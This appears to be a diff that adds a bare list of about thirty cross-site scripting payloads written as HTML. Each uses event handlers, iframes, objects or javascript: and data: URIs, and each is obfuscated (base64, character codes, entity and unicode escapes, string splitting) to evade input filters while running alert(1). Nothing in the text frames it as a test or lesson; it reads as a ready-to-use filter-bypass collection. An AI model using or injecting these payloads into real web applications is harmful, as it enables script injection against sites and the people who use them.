@@ -1,0 +1,32 @@
+```html
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<svg onload=eval('\u0061lert(1)')>
+<iframe srcdoc="<script>al\u0065rt(1)</script>"></iframe>
+<marquee onstart=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></marquee>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<details open ontoggle=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))></details>
+<meta http-equiv="refresh" content="0;url=javascript:eval('al'+'ert(1)')">
+<svg><a href="javascript&colon;&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">Click</a></svg>
+<iframe src="javascript:window['al'+'ert'](1)"></iframe>
+<details ontoggle='(window.Function(atob("YWxlcnQoMSk=")))()'></details>
+<object type="text/html" data="javascript&colon;'alert'&lpar;1&rpar;"></object>
+<svg xmlns="http://www.w3.org/2000/svg" onload="&#97;&#108;&#101;&#114;&#116;(1)"></svg>
+<iframe srcdoc="<meta http-equiv='refresh' content='0; url=javascript:al%65rt(1)'>"></iframe>
+<marquee onstart="window['al'+'ert'](1)"></marquee>
+<svg onload="setTimeout('al'+'ert(1)',0)"></svg>
+<object data="data:text/html,<script>al%65rt(1)</script>"></object>
+<marquee onstart=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))></marquee>
+<svg onload='eval("al"+"ert(1)")'></svg>
+<object data="javascript&colon;al\x65rt(1)"></object>
+<details ontoggle="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></details>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<marquee onstart="eval(decodeURIComponent('%61%6c%65%72%74%281%29'))"></marquee>
+<img src=x onerror="window['al'+'ert']('1')">
+<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>
+<iframe src="javascript:eval(atob('YWxlcnQoMSk='))"></iframe>
+<object data="data:text/html,<svg onload=alert(1)></svg>"></object>
+<marquee onstart='eval(atob("YWxlcnQoMSk="))'></marquee>
+<img src=x onerror="eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))">
+<svg onload="window['al'+'ert']('XSS')"></svg>
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+"></object>
+```
